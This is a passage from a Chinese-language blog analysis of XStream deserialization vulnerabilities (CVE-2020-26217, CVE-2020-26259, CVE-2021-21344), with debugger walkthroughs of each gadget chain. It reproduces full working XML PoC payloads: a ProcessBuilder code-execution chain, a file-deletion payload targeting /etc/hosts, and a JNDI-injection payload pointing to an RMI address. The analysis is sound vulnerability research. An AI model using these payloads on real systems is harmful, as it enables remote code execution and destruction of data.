class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复现：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731164706500.png" alt="image-20210731164706500" style="zoom:50%;"><p>调试：</p><p>这次PoC是map结构，其中key为jdk.nashorn.internal.objects.NativeString对象、value值为test的Entry；</p><p>而jdk.nashorn.internal.objects.NativeString对象又存在flags、value属性，它的flags属性值为0、value属性值为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data；</p><p>前面简单几步直接跳过，不过就是首先还原出来一个hashmap，然后将本地的key，value分别赋值。</p><p>也就是MapConverter这里，target是hashmap实例，我们需要放进去的是key是NativeString，value是test字符串</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731180419083.png" alt="image-20210731180419083"></p><p>进入put，首先需要计算key的hash值：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731180636825.png" alt="image-20210731180636825" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731180702829.png" alt="image-20210731180702829" style="zoom:50%;"><p>这里的this就是key，也就是NativeString对象，对应的this.value就是NativeString对象的value属性，也就是payload里面的Base64Data对象：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731180733336.png" alt="image-20210731180733336" style="zoom:50%;"><p>由于this.value不是String类型的变量，会执行<code>this.value.toString()</code>，继续跟：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731181123157.png" alt="image-20210731181123157" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731181151939.png" alt="image-20210731181151939" style="zoom:50%;"><p><code>this.get</code>方法也就是Base64Data对象的get方法，如上图，在get方法内部其实本质上是调用了Base64Data对象的dataHandler属性，看PoC，<code>this.dataHandler.getDataSource()</code>返回的是<code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</code></p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731182419927.png" alt="image-20210731182419927"></p><p>这里本质上is就是PoC里面的is属性值，也就是PoC里面的<code>java.io.SequenceInputStream</code></p><p>接下来执行到<code>readFrom</code>方法：</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731185247655.png" alt="image-20210731185247655"></p><p>进入<code>read</code>方法：</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731185429795.png" alt="image-20210731185429795"></p><p>进入<code>nextStream</code>方法：</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731185551586.png" alt="image-20210731185551586"></p><p>这里的in和e在PoC里面都有对应的构造</p><p>接下来会调用<code>e.nextElement()</code>方法</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731185847554.png" alt="image-20210731185847554" style="zoom:50%;"><p>iterator属性也有对应的PoC构造，也就是<code>java.imageio.spi.FilterIterator</code></p><p>接下来需要执行的是<code>iterator.next().getKey();</code></p><p>先来到<code>next()</code>方法</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801132432728.png" alt="image-20210801132432728" style="zoom:50%;"><p>会先调用<code>advance()</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801132529807.png" alt="image-20210801132529807" style="zoom:50%;"><p>这里iter属性是<code>java.util.ArrayList$Itr</code>，filter属性是<code>javax.imageio.ImageIO$ContainsFilter</code></p><p>进入<code>filter.filter(elt)</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801132837648.png" alt="image-20210801132837648" style="zoom:50%;"><p>看到这里直接就是对method属性进行了invoke调用，method是我们的start方法，name是start字符串</p><p>elt是什么？elt就是上一步的<code>iter.next()</code>的返回值，是<code>java.lang.ProcessBuilder</code>对象。</p><p>elt为构造好的java.lang.ProcessBuilder对象。在method与elt都可控的情况下，进行反射调用即可实现远程代码执行利用。</p><p>修复：</p><p>在1.4.14中对反射调用时，对class进行了黑名单拦截：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801134138222.png" alt="image-20210801134138222" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801134206689.png" alt="image-20210801134206689" style="zoom:50%;"><h1 id="CVE-2020-26259"><a href="#CVE-2020-26259" class="headerlink" title="CVE_2020_26259"></a>CVE_2020_26259</h1><p>XStream：1.4.13</p><h2 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>一种任意文件删除漏洞</p><h2 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h2><p>来自官网的PoC：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.util.ReadAllStream$FileStream'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">tempFile</span>&gt;</span>/etc/hosts<span class="tag">&lt;/<span class="name">tempFile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>26259和26217很像，前半段都利用了<code>NativeString</code>，<code>Base64Data</code>，<code>XmlDataSource</code></p><p>但是后半段的<code>is</code>属性有区别，是<code>com.sun.xml.internal.ws.util.ReadAllStream$FileStream</code></p><p>调试：</p><p>还是来到get方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801141753861.png" alt="image-20210801141753861" style="zoom:50%;"><p>值得注意的是，这次漏洞利用的不是Base64Data中get方法里的baos.readFrom(is)这个入口，而是位于它下面一行的is.close()这行代码。通过调试，程序在执行过get方法中baos.readFrom(is)后，紧接着执行is.Close()。</p><p>此时的is是<code>com.sun.xml.internal.ws.util.ReadAllStream$FileStream</code>，跟入其中的close方法，见下图：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801142302517.png" alt="image-20210801142302517" style="zoom:50%;"><p>当这里<code>tempFile</code>属性其实是PoC中可控的：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tempFile</span>&gt;</span>/etc/hosts<span class="tag">&lt;/<span class="name">tempFile</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所以如果这里tempFile字段不为空，则直接删除，存在一个任意文件删除漏洞</p><h1 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE_2021_21344"></a>CVE_2021_21344</h1><p>XStream：1.4.15</p><h2 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>RCE，最终漏洞的触发点是JdbcRowSetImpl 是JNDI类型注入漏洞</p><h2 id="PoC-3"><a href="#PoC-3" class="headerlink" title="PoC"></a>PoC</h2><p>来自官网：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">'sun.awt.datatransfer.DataTransferer$IndexOrderComparator'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.client.ResponseContext'</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.message.JAXBAttachment'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.BridgeImpl'</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">'com.sun.rowset.JdbcRowSetImpl'</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>调试：</p><p>不难看出这次反序列化的入口点是<code>PriorityQueue</code>，它也是cc链中高频出现的节点。</p><p>在之前分析过程中我们也知道，对于实现了<code>Serializable</code>接口的类对象，在反序列化过程中会调用重写的<code>readObject</code>方法</p><p>我们可以在<code>readObject</code>方法处打断点：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210803220000591.png" alt="image-20210803220000591" style="zoom:50%;"><p>进入<code>heapify()</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210803220110388.png" alt="image-20210803220110388" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210803220130104.png" alt="image-20210803220130104" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210803220200383.png" alt="image-20210803220200383" style="zoom:50%;"><p>一路下来，在这里调用了PriorityQueue类中存储在comparator属性中的对象的compare方法，也就是PoC中的<code>sun.awt.datatransfer.DataTransferer$IndexOrderComparator</code>类对象，也就是说接下来会去调用这个类的<code>compare</code>方法</p><p>接下来会调用一系列的函数，太长了，贴一下调用栈：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">java.util.PriorityQueue#heapify</span><br><span class="line">  sun.awt.datatransfer.DataTransferer$IndexOrderComparator#compare</span><br><span class="line">    com.sun.xml.internal.ws.client.ResponseContext#get</span><br><span class="line">      com.sun.xml.internal.ws.api.message.MessageWrapper#getAttachments</span><br><span class="line">        com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getAttachments</span><br><span class="line">          com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getMessage</span><br><span class="line">            com.sun.xml.internal.ws.message.JAXBAttachment#getInputStream</span><br><span class="line">              com.sun.xml.internal.ws.message.JAXBAttachment#asInputStream</span><br><span class="line">                com.sun.xml.internal.ws.message.JAXBAttachment#writeTo</span><br><span class="line">                  com.sun.xml.internal.ws.db.glassfish.BridgeWrapper#marshal</span><br><span class="line">                    com.sun.xml.internal.bind.api.Bridge#marshal</span><br><span class="line">                      com.sun.xml.internal.bind.v2.runtime.BridgeImpl#marshal</span><br><span class="line">                        com.sun.xml.internal.bind.v2.runtime.MarshallerImpl#write</span><br><span class="line">                          com.sun.xml.internal.bind.v2.runtime.XMLSerializer#childAsXsiType</span><br><span class="line">                            com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl#serializeURIs</span><br><span class="line">                              com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get</span><br><span class="line">                                com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData</span><br><span class="line">                                  com.sun.rowset.JdbcRowSetImpl#connect</span><br></pre></td></tr></table></figure><p>关键点在<code>com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get</code></p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210804182242246.png" alt="image-20210804182242246" style="zoom:50%;"><p>这里存在invoke函数，导致整个链可以连通。</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210804183142196.png" alt="image-20210804183142196" 